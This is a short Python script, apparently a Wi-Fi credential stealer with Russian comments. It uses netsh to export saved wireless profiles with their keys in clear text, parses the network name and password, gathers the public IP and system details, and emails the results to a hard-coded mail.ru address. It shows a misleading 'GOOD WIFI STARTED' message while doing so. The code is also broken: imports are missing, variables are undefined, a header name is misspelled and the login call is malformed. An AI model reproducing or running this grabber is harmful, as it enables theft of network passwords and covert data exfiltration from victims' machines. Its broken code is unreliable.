#Код пренадлежит Алишеру или Defsec16
from time import sleep
import platform as pf 
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket


sp.call('netsh wlan show profile')
sp.call('netsh wlan export profile folder=C:\\ key =clear')

print('GOOD WIFI STARTED')

sleep(2)

def wifi_parse():
	doc = minidom.parse('C:\\Беспроводная сеть-wifi .xml')#Имя сети замените wifi на ваше название вай-фая

	wifi_name = doc.getElementsByTagName('name')
	wifi_password = doc.getElementsByTagName('keyMaterial')

	global data
	data = f'Wi-Fi name : { wifi_name[0].firstChild.data}\nWi-Fi password :{wifi_password}'

def get_ip():
	response = requests.get('https://myip.dnsomatic.com/')

	ip =response.text 

	global data_ip
	data_ip = f'IP ADDRESS : {IP}'
def info_pc():
	processor = pf.processor()
	name_sys = pf.system() + ' ' + pf.release()
	net_pc= pf.node()
	ip_pc = socket.gethostbyname(socket.gethostname())

	global data_pc
	data_pc = f'''
	Процессор : { processor }\n
	Система : { name_sys }\n
	Сетевое имя ПК :{ net_pc }\n
	IP Адрес ПК : { ip_pc }\n
	'''

def all_info():
	global data_all_info
	data_all_info = f'{ data }\n{ data_ip }\n{ data_pc }\n'
def send_mail():
	msg = MIMEMultipart()
	msg[ 'Subgject' ] ='Info of PC'
	msg[ 'From' ] ='opreds@mail.ru'#mail откуда
	body = data_all_info
	msg.attach(MIMEText(body,'plain'))

	server = smtplib.SMTP_SSL( 'smtp.mail.ru' ,465)

	server.login('opreds, soobshenie') #Логин и пароль ваш
	server.sendmail('opreds@mail.ru','opreds@mail.ru',msg.as_string())#от кого к кому
	server.quit()
def main():
	wifi_parse()
	get_ip()
	info_pc()
	all_info()
	send_mail()
main()